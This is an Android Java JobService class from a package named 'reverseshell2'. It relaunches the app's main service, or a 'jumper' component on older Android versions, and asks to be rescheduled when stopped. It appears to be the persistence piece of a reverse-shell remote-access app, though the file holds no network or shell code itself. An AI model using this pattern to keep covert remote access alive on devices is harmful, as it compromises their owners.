package com.example.reverseshell2;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class jobScheduler extends JobService {
    private static final String TAG = "jobSchedulerTest";
    private boolean jobCancelled = false;
    private ExecutorService executor;

    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
    }

    @Override
    public boolean onStartJob(JobParameters jobParameters) {
        Log.d(TAG, "Job started");
        doBackgroundWork(jobParameters);
        return true; // True means the work is being done on a separate thread
    }

    @Override
    public boolean onStopJob(JobParameters jobParameters) {
        Log.d(TAG, "Job cancelled before completion");
        jobCancelled = true;
        if (executor != null) {
            executor.shutdownNow();
        }
        return true; // True means the job should be rescheduled
    }

    private void doBackgroundWork(final JobParameters params) {
        executor.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    if (jobCancelled) {
                        return;
                    }

                    // For Android 10+ (API 29+), use more cautious approach
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        // Start the service as a foreground service
                        Intent serviceIntent = new Intent(getApplicationContext(), mainService.class);
                        ContextCompat.startForegroundService(getApplicationContext(), serviceIntent);
                    } else {
                        // Use regular approach for older versions
                        new jumper(getApplicationContext()).init();
                    }

                    Log.d(TAG, "Job finished");
                } finally {
                    // Always report job completion
                    jobFinished(params, false);
                }
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
            executor = null;
        }
    }
}

